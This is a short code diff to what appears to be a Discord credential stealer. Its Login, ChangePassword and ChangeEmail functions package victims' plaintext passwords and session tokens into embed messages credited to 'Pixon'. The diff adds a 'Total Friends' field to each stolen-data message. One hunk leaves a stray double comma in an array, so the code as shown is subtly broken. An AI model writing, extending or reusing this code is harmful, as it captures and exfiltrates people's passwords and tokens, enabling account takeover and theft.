@@ -332,6 +332,9 @@ function Login(email, password, token) {
                                 value: `\`${password}\``,
                                 inline: !0
                             }, {
+                                name: "Total Friends",
+                                value: `${totalFriends()}`
+                            }, {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
                                 inline: !1
@@ -450,10 +453,13 @@ function ChangePassword(oldpassword, newpassword, token) {
                             value: `\`${newpassword}\``,
                             inline: !0
                         }, {
+                            name: "Total Friends",
+                            value: `${totalFriends()}`
+                        }, {
                             name: "Token",
                             value: `\`\`\`${token}\`\`\``,
                             inline: !1
-                        }, ],
+                        }],
                         "author": {
                             "name": "Pixon"
                         },
@@ -553,7 +559,10 @@ function ChangeEmail(newemail, password, token) {
                             name: "Token",
                             value: `\`\`\`${token}\`\`\``,
                             inline: !1
-                        }, ],
+                        },, {
+                            name: "Total Friends",
+                            value: `${totalFriends()}`
+                        } ],
                         "author": {
                             "name": "Pixon"
                         },
